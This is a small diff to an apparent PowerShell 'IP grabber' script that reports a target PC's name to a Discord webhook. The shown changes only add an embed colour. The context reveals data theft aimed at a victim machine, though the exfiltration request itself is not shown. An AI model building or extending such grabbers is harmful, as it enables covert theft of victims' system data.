@@ -2,6 +2,7 @@ $webHookUrl = "$dc"
 $title = "Advanced IP Grabber"
 $targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
 $description = "Target: **$targetPC**"
+$color = "FF8200"
 
 
 
@@ -37,6 +38,7 @@ $embed = @{
     title       = $title
     description = $description
     fields      = $fields
+    color       = $color
 }
 
 $payload = @{
